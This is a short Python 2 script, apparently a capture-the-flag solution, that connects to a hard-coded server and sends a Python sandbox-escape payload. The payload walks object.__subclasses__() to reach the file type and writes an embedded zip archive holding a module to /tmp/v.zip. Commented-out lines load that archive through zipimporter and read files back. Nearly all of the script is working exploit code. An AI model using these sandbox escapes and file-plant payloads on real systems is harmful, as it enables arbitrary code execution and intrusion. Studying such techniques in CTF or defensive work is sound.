import socket
import time
import sys
SIZE = 1024
# x = ''
# y = ''
# with open('v.zip', 'rb') as f:
#     x = f.read()
#     y = [x]
# print(y)
# for i in range(len(y) / 20 + 1):
#     print([y[i * 20:(i + 1) * 20]])
# sys.exit(0)
#
#
# print(().__class__.__bases__[0].__subclasses__()[40](r'/tmp/v.zip').read())
# print ().__class__.__bases__[0].__subclasses__()[55]('/tmp/v.zip')
# print ().__class__.__bases__[0].__subclasses__()[55]('/tmp/v.zip').load_module('SyntaxError')
# ().__class__.__bases__[0].__subclasses__()[55]('/tmp/v.zip').get_source('SyntaxError')
#
#
HOST = '117.78.43.163'
PORT = 31516
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
data = s.recv(SIZE)
# print(data,'')
data = s.recv(SIZE)
print(data, '')
print("start ...")
p = "PK\\x03\\x04\\x14\\x00\\x08\\x00\\x08\\x00E+\\x9dL\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x0e\\x00\\x10\\x00SyntaxError.pyUX\\x0c\\x00+\\xe7\\xe4Z\\xf2\\xe6\\xe4Z\\xf5\\x01\\x14\\x00m\\x8eA\\x0b\\x82@\\x14\\x84\\xef\\xfb+\\x96=\\xed\\x82=[\\t\\xd2C\\x07\\t\\x83\\x88\\n\\xd2[\\x84\\xe8\\xb6\\xd1\\x92\\xed.>\\xfd\\xff\\x19i\\'\\xdfe\\x98o\\x06\\xde\\x98\\xb7wmG\\xd1\\xa9\\x97\\xee\\x88\\x19]_\\xfb\\xd6)\\x8d8\\x11\\x87\\x04\\xe9f\\xac\\xc1O\\xf8\\xe8\\xd2]\\xb9?eE0\\xa5\\xf9y{(\\xf3\\xe2\\x92\\xa5GA\\x10\\x94\\xb3V\\xab\\x8es&e\\x02Q\\x0c\\xf1\\nd\\xb2f\\x01M\\x86\\x13\\x828\\x84{\\xef#\\x8e\\xf00\\x8d\\xb6\\x8e\\x8b\\x80.\\xe7\\xb1\\x9c\\xc7\\x91 \\xfe\\xbb\\xee?\\x1bT\\xd54\\xfc\\xca\\xc2\\xda\\xd8\\x10\\x9f\\xc3/\\xb60\\xec&\\xc8\\x07PK\\x07\\x08\\xb6\\xe4i\\'\\x9d\\x00\\x00\\x00\\xef\\x00\\x00\\x00PK\\x01\\x02\\x15\\x03\\x14\\x00\\x08\\x00\\x08\\x00E+\\x9dL\\xb6\\xe4i\\'\\x9d\\x00\\x00\\x00\\xef\\x00\\x00\\x00\\x0e\\x00\\x0c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00@\\xa4\\x81\\x00\\x00\\x00\\x00SyntaxError.pyUX\\x08\\x00+\\xe7\\xe4Z\\xf2\\xe6\\xe4ZPK\\x05\\x06\\x00\\x00\\x00\\x00\\x01\\x00\\x01\\x00H\\x00\\x00\\x00\\xe9\\x00\\x00\\x00\\x00\\x00"
pp = "().__class__.__bases__[0].__subclasses__()[40](r'/tmp/v.zip','wb').write('%s')\n" % (p)
print(pp)
s.sendall(pp)
data = s.recv(SIZE)
print(data, 'emmmm')

# s.sendall(
#     "print(().__class__.__bases__[0].__subclasses__()[40](r'/tmp/v.zip').read())\n")
# data = s.recv(SIZE)
# print(data, '')
s.close()
# data = s.recv(SIZE)
# print(data,'')
